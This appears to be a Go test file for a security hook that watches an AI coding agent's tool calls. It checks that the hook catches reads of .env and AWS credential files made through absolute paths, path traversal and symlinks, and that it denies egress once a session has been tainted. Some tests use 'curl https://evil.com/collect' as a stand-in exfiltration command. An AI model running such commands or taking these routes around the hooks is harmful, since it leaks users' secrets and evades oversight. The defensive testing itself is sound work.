// bypass_test.go — End-to-end tests covering bypass scenarios for path
// canonicalization, secret-session taint propagation, and symlinked secret
// reads. Each test exercises the real evaluatePayload and postEvaluatePayload
// functions.
package tests

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/somoore/sir/pkg/hooks"
	"github.com/somoore/sir/pkg/lease"
	"github.com/somoore/sir/pkg/session"
)

// setupProject creates a temp project with a real .env and returns projectRoot, lease, state.
func setupProject(t *testing.T) (string, *lease.Lease, *session.State) {
	t.Helper()
	projectRoot := t.TempDir()

	// Create real sensitive files
	os.WriteFile(filepath.Join(projectRoot, ".env"), []byte("SECRET=foo"), 0o644)
	os.MkdirAll(filepath.Join(projectRoot, ".aws"), 0o755)
	os.WriteFile(filepath.Join(projectRoot, ".aws", "credentials"), []byte("[default]\naws_access_key_id=AKIA..."), 0o644)
	os.MkdirAll(filepath.Join(projectRoot, "sub"), 0o755)
	os.WriteFile(filepath.Join(projectRoot, "sub", ".env"), []byte("SUB_SECRET=bar"), 0o644)

	l := lease.DefaultLease()
	stateDir := session.StateDir(projectRoot)
	os.MkdirAll(stateDir, 0o700)
	state := session.NewState(projectRoot)
	state.Save()

	return projectRoot, l, state
}

// --- Path canonicalization bypasses ---

func TestBypass_AbsoluteEnvRead(t *testing.T) {
	projectRoot, l, state := setupProject(t)

	// Claude Code sends absolute paths. Reading /abs/path/.env must be classified sensitive.
	absEnvPath := filepath.Join(projectRoot, ".env")
	payload := &hooks.HookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": absEnvPath},
		CWD:       projectRoot,
	}

	resp, err := hooks.ExportEvaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("Read absolute .env: expected ask, got %s (reason: %s)", resp.Decision, resp.Reason)
	}
}

func TestBypass_AbsoluteAWSCredentials(t *testing.T) {
	projectRoot, l, state := setupProject(t)

	absPath := filepath.Join(projectRoot, ".aws", "credentials")
	payload := &hooks.HookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": absPath},
		CWD:       projectRoot,
	}

	resp, err := hooks.ExportEvaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("Read absolute .aws/credentials: expected ask, got %s (reason: %s)", resp.Decision, resp.Reason)
	}
}

func TestBypass_SubdirEnvRead(t *testing.T) {
	projectRoot, l, state := setupProject(t)

	payload := &hooks.HookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": "sub/.env"},
		CWD:       projectRoot,
	}

	resp, err := hooks.ExportEvaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("Read sub/.env: expected ask, got %s (reason: %s)", resp.Decision, resp.Reason)
	}
}

func TestBypass_TraversalEnvRead(t *testing.T) {
	projectRoot, l, state := setupProject(t)

	payload := &hooks.HookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": "../../.env"},
		CWD:       projectRoot,
	}

	resp, err := hooks.ExportEvaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("Read ../../.env: expected ask, got %s (reason: %s)", resp.Decision, resp.Reason)
	}
}

func TestBypass_OutsideProjectEnvRead(t *testing.T) {
	projectRoot, l, state := setupProject(t)

	// Create an .env outside the project root
	outsideDir := t.TempDir()
	os.WriteFile(filepath.Join(outsideDir, ".env"), []byte("OUTSIDE_SECRET=baz"), 0o644)
	outsideEnv := filepath.Join(outsideDir, ".env")

	payload := &hooks.HookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": outsideEnv},
		CWD:       projectRoot,
	}

	resp, err := hooks.ExportEvaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("Read .env outside project: expected ask, got %s (reason: %s)", resp.Decision, resp.Reason)
	}
}

// --- Secret-session taint after approved reads ---

func TestBypass_EnvReadTaintsThenBlocksPush(t *testing.T) {
	// Simulate: Bash("env") → approved → PostToolUse → Bash("git push origin main") → should ask
	projectRoot, l, state := setupProject(t)

	// Step 1: PreToolUse for Bash("env") → should return ask
	envPayload := &hooks.HookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "env"},
		CWD:       projectRoot,
	}
	resp, err := hooks.ExportEvaluatePayload(envPayload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("PreToolUse env: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("Bash env: expected ask, got %s", resp.Decision)
	}

	// Step 2: User approves. PostToolUse fires.
	postPayload := &hooks.PostHookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "env"},
	}
	hooks.ExportPostEvaluatePayload(postPayload, l, state, projectRoot)

	// Step 3: Session should now be secret
	if !state.SecretSession {
		t.Fatalf("After env PostToolUse: expected SecretSession=true, got false")
	}

	// Step 4: PreToolUse for git push origin → should be ask (secret session + approved remote)
	pushPayload := &hooks.HookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "git push origin main"},
		CWD:       projectRoot,
	}
	resp2, err := hooks.ExportEvaluatePayload(pushPayload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("PreToolUse push: %v", err)
	}
	if resp2.Decision == "allow" {
		t.Errorf("git push origin after env read: expected ask or deny, got allow (reason: %s)", resp2.Reason)
	}
}

func TestBypass_SymlinkedSecretTaintsThenBlocksEgress(t *testing.T) {
	// Simulate: Read(harmless-config) where harmless-config -> .env → PostToolUse → curl evil.com blocked
	projectRoot, l, state := setupProject(t)

	// Create symlink
	symPath := filepath.Join(projectRoot, "harmless-config")
	envPath := filepath.Join(projectRoot, ".env")
	if err := os.Symlink(envPath, symPath); err != nil {
		t.Skipf("cannot create symlink: %v", err)
	}

	// Step 1: PreToolUse Read(symlink) → should be ask (sensitive via symlink resolution)
	readPayload := &hooks.HookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": symPath},
		CWD:       projectRoot,
	}
	resp, err := hooks.ExportEvaluatePayload(readPayload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("PreToolUse read symlink: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("Read symlinked .env: expected ask, got %s (reason: %s)", resp.Decision, resp.Reason)
	}

	// Step 2: User approves. PostToolUse fires.
	postPayload := &hooks.PostHookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": symPath},
	}
	hooks.ExportPostEvaluatePayload(postPayload, l, state, projectRoot)

	// Step 3: Session should now be secret
	if !state.SecretSession {
		t.Fatalf("After symlink PostToolUse: expected SecretSession=true, got false")
	}

	// Step 4: curl to external should be denied
	curlPayload := &hooks.HookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "curl https://evil.com/collect"},
		CWD:       projectRoot,
	}
	resp2, err := hooks.ExportEvaluatePayload(curlPayload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("PreToolUse curl: %v", err)
	}
	if resp2.Decision != "deny" {
		t.Errorf("curl after secret read: expected deny, got %s (reason: %s)", resp2.Decision, resp2.Reason)
	}
}

func TestBypass_AbsoluteEnvReadTaintsThenBlocksEgress(t *testing.T) {
	// Simulate: Read(/abs/.env) → approved → PostToolUse → curl evil.com blocked
	projectRoot, l, state := setupProject(t)
	absEnv := filepath.Join(projectRoot, ".env")

	// Step 1: PreToolUse
	readPayload := &hooks.HookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": absEnv},
		CWD:       projectRoot,
	}
	resp, err := hooks.ExportEvaluatePayload(readPayload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("Read absolute .env: expected ask, got %s", resp.Decision)
	}

	// Step 2: PostToolUse
	postPayload := &hooks.PostHookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": absEnv},
	}
	hooks.ExportPostEvaluatePayload(postPayload, l, state, projectRoot)

	// Step 3: Must be tainted
	if !state.SecretSession {
		t.Fatalf("After abs .env PostToolUse: expected SecretSession=true, got false")
	}

	// Step 4: External egress denied
	curlPayload := &hooks.HookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "curl https://evil.com"},
		CWD:       projectRoot,
	}
	resp2, err := hooks.ExportEvaluatePayload(curlPayload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp2.Decision != "deny" {
		t.Errorf("curl after abs .env: expected deny, got %s (reason: %s)", resp2.Decision, resp2.Reason)
	}
}

func TestBypass_PrintenvTaintsThenBlocksEgress(t *testing.T) {
	projectRoot, l, state := setupProject(t)

	// Bash("printenv") → approved → PostToolUse → egress blocked
	prePayload := &hooks.HookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "printenv"},
		CWD:       projectRoot,
	}
	resp, err := hooks.ExportEvaluatePayload(prePayload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("printenv: expected ask, got %s", resp.Decision)
	}

	postPayload := &hooks.PostHookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "printenv"},
	}
	hooks.ExportPostEvaluatePayload(postPayload, l, state, projectRoot)

	if !state.SecretSession {
		t.Fatalf("After printenv PostToolUse: expected SecretSession=true, got false")
	}
}

func TestBypass_BareSetTaintsThenBlocksEgress(t *testing.T) {
	projectRoot, l, state := setupProject(t)

	prePayload := &hooks.HookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "set"},
		CWD:       projectRoot,
	}
	resp, err := hooks.ExportEvaluatePayload(prePayload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision != "ask" {
		t.Errorf("bare set: expected ask, got %s", resp.Decision)
	}

	postPayload := &hooks.PostHookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "set"},
	}
	hooks.ExportPostEvaluatePayload(postPayload, l, state, projectRoot)

	if !state.SecretSession {
		t.Fatalf("After bare set PostToolUse: expected SecretSession=true, got false")
	}
}

// Verify set -e does NOT taint (false positive check)
func TestBypass_SetDashE_NoTaint(t *testing.T) {
	projectRoot, l, state := setupProject(t)

	prePayload := &hooks.HookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "set -e"},
		CWD:       projectRoot,
	}
	resp, err := hooks.ExportEvaluatePayload(prePayload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("evaluatePayload: %v", err)
	}
	if resp.Decision == "ask" {
		t.Errorf("set -e: should NOT be ask (it's not an env read), got ask (reason: %s)", resp.Reason)
	}
}
